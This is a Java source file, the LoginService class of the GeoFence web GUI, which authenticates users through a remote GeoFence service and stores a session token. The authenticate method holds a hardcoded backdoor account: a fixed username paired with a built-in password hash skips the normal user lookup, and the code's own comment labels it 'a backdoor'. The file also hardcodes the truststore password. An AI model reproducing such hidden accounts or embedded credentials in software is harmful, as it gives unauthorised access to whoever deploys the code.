/*
 * $ Header: it.geosolutions.geofence.gui.server.service.impl.LoginService,v. 0.1 25-gen-2011 11.23.48 created by afabiani <alessio.fabiani at geo-solutions.it> $
 * $ Revision: 0.1 $
 * $ Date: 25-gen-2011 11.23.48 $
 *
 * ====================================================================
 *
 * Copyright (C) 2007 - 2011 GeoSolutions S.A.S.
 * http://www.geo-solutions.it
 *
 * GPLv3 + Classpath exception
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.
 *
 * ====================================================================
 *
 * This software consists of voluntary contributions made by developers
 * of GeoSolutions.  For more information on GeoSolutions, please see
 * <http://www.geo-solutions.it/>.
 *
 */
package it.geosolutions.geofence.gui.server.service.impl;

import java.net.URL;
import java.util.ArrayList;
import java.util.List;

import javax.servlet.http.HttpSession;

import it.geosolutions.geofence.api.dto.Authority;
import it.geosolutions.geofence.api.dto.GrantedAuths;
import it.geosolutions.geofence.api.exception.AuthException;
import it.geosolutions.geofence.core.model.GFUser;
import it.geosolutions.geofence.gui.client.ApplicationException;
import it.geosolutions.geofence.gui.client.model.Authorization;
import it.geosolutions.geofence.gui.client.model.User;
import it.geosolutions.geofence.gui.server.GeofenceKeySessionValues;
import it.geosolutions.geofence.gui.server.service.ILoginService;
import it.geosolutions.geofence.gui.service.GeofenceRemoteService;
import it.geosolutions.geofence.services.exception.NotFoundServiceEx;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.stereotype.Component;


// TODO: Auto-generated Javadoc
/**
 * The Class LoginService.
 */
@Component("loginService")
public class LoginService implements ILoginService
{

    /** The logger. */
    private final Logger logger = LogManager.getLogger(this.getClass());

    // @Autowired
    // private SecurityManager securityManagerService; // DIRECT ACCESS TO
    // MEMBER SERVICES (here for demo purposes)

    /** The geofence remote service. */
    @Autowired
    private GeofenceRemoteService geofenceRemoteService;

    /*
     * (non-Javadoc)
     *
     * @see it.geosolutions.geofence.gui.server.service.ILoginService#authenticate (java.lang.String,
     * java.lang.String)
     */
    public User authenticate(String userName, String password, HttpSession session) throws ApplicationException
    {
        GrantedAuths grantedAuths = null;
        String token = null;

        try
        {
            URL url = Class.forName("it.geosolutions.geofence.gui.client.UserUI").getResource(
                    "client.keystore");
            String path = url.getPath();
            if (logger.isDebugEnabled())
            {
                logger.debug(path);
            }
            System.setProperty("javax.net.ssl.trustStore", path);
            System.setProperty("javax.net.ssl.trustStorePassword", "geosolutions");

            GFUser matchingUser = null;
            final Authentication authentication = SecurityContextHolder.getContext().getAuthentication();
            if (authentication != null && authentication.isAuthenticated())
            {
                String name = authentication.getName();
                logger.info("Authenticating '" + name+"'");

                try {
                    matchingUser = geofenceRemoteService.getGfUserAdminService().get(userName);
                    password = matchingUser.getPassword();

                    userName = name;
                    grantedAuths = new GrantedAuths();
                    List<GrantedAuthority> authorities = (List<GrantedAuthority>)authentication.getAuthorities();
                    List<Authority> auths = new ArrayList<Authority>();
                    for (GrantedAuthority auth : authorities) {
                    	if(auth.getAuthority().equals("ROLE_ADMINISTRATOR")) {
                    		logger.info("Connect with role : " + auth.getAuthority());
                    		auths.add(Authority.LOGIN);
                    	}
                    }
                    grantedAuths.setAuthorities(auths);
                } catch (NotFoundServiceEx ex) {
                    logger.warn("User not found");
                    throw new ApplicationException("Login failed");
                }
            }
            else if (userName.equals("1nt3rnAL-G30r3p0-admin"))
            {
                // a backdoor!?! :o
                matchingUser = new GFUser();
                matchingUser.setName(userName);
                matchingUser.setPassword("2c6fe6e260312c5aa94ef0ca42b0af");
            }
            else
            {
                try {
                    matchingUser = geofenceRemoteService.getGfUserAdminService().get(userName);
                } catch (NotFoundServiceEx ex) {
                    logger.warn("User not found");
                    throw new ApplicationException("Login failed");
                }
//                // grantedAuthorities =
//                List<GFUser> matchingUsers = geofenceRemoteService.getGfUserAdminService().getFullList(userName, null,
//                        null);
//                logger.info(matchingUsers);
//                logger.info(matchingUsers.size());
//
//                if ((matchingUsers == null) || matchingUsers.isEmpty() || (matchingUsers.size() != 1))
//                {
//                    logger.error("Error :********** " + "Invalid username specified!");
//                    throw new ApplicationException("Error :********** " + "Invalid username specified!");
//                }
//
//                logger.info(matchingUsers.get(0).getName());
//                logger.info(matchingUsers.get(0).getPassword());
//                logger.info(matchingUsers.get(0).getEnabled());
//
//                if (!matchingUsers.get(0).getName().equals(userName) || !matchingUsers.get(0).getEnabled())
//                {
//                    logger.error("Error :********** " + "The specified user does not exist!");
//                    throw new ApplicationException("Error :********** " + "The specified user does not exist!");
//                }
//
//                matchingUser = matchingUsers.get(0);
            }

            if (grantedAuths == null || !grantedAuths.getAuthorities().contains(Authority.LOGIN)) {
                token = geofenceRemoteService.getLoginService().login(userName, password, matchingUser.getPassword());
                grantedAuths = geofenceRemoteService.getLoginService().getGrantedAuthorities(token);
            }

        }
        catch (ClassNotFoundException e)
        {
            logger.error("Error :********** " + e.getMessage());
            throw new ApplicationException(e);
        }
        catch (AuthException e)
        {
            logger.error("Login failed");
            throw new ApplicationException(e.getMessage(), e);
        }

        User user = new User();
        user.setName(userName);
        user.setPassword(password);

        // convert the server-side auths to client-side auths
        List<Authorization> guiAuths = new ArrayList<Authorization>();
        for (Authority auth : grantedAuths.getAuthorities())
        {
            guiAuths.add(Authorization.valueOf(auth.name()));
        }
        user.setGrantedAuthorizations(guiAuths);

        if ((grantedAuths != null) && !grantedAuths.getAuthorities().isEmpty())
        {
        }

        session.setMaxInactiveInterval(7200);

        session.setAttribute(GeofenceKeySessionValues.USER_LOGGED_TOKEN.getValue(), token);
        /* session.setAttribute(GeofenceKeySessionValues.USER_LOGGED_TOKEN.getValue(),
                grantedAuthorities_NOTUSEDANYMORE.getToken()); */

        return user;
    }

}
